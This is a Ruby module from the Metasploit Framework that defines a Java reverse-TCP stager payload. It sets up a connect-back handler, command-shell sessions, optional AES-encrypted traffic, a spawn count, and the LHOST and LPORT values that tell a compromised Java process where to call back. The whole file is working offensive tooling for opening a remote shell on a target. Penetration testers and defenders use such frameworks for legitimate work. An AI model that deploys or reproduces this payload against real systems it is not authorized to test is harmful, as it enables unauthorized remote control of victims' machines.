##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Stager
  include Msf::Payload::Java

  handler module_name: 'Msf::Handler::ReverseTcp'

  def initialize(info = {})
    super(
        Msf::Module::ModuleInfo.merge!(
            info,
            'Name'          => 'Java Reverse TCP Stager',
            'Description'   => 'Connect back stager',
            'Author'        => [
                'mihi',  # all the hard work
                'egypt', # msf integration
            ],
            'License'       => MSF_LICENSE,
            'Platform'      => 'Java',
            'Arch'          => ARCH_JAVA,
            'Convention'    => 'javasocket',
            'Stager'        => {'Payload' => ""}
        )
    )

    register_advanced_options(
      [
        Msf::OptString.new('AESPassword', [ false, "Password for encrypting communication", '' ]),
        Msf::OptInt.new('Spawn', [ true, "Number of subprocesses to spawn", 2 ])
      ], self.class
    )

    @class_files = [ ]
  end

  def config
    spawn = data_store["Spawn"] || 2
    c =  ""
    c << "Spawn=#{spawn}\n"
    pass = data_store["AESPassword"] || ""
    if pass != ""
      c << "AESPassword=#{pass}\n"
      @class_files = [
        [ "metasploit", "AESEncryption.class" ],
      ]
    else
      @class_files = [ ]
    end
    c << "LHOST=#{data_store["LHOST"]}\n" if data_store["LHOST"]
    c << "LPORT=#{data_store["LPORT"]}\n" if data_store["LPORT"]

    c
  end

end
